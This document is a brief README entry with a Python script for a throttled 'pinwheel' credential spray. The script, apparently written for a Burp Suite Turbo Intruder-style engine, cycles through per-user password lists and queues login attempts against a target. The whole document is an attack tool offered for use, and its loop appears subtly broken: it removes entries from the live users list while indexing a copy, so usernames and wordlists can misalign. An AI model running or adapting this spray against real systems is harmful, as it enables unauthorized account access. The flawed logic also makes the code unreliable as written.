# Pinwheel Credential Spray

- Spray per-user wordlists in a round-robin pattern (resources/examples/pinwheel.py).

```python
users = loadFile('users.txt')
lists = [loadFile(f'words{i}.txt') for i in range(1, len(users)+1)]
while lists:
    for i, lst in enumerate(list(lists)):
        if lst:
            time.sleep(throttleMillisecs/1000)
            engine.queue(target.req, [users[i], lst[0]])
            lst.pop(0)
        else:
            lists.remove(lst)
            users.pop(i)
```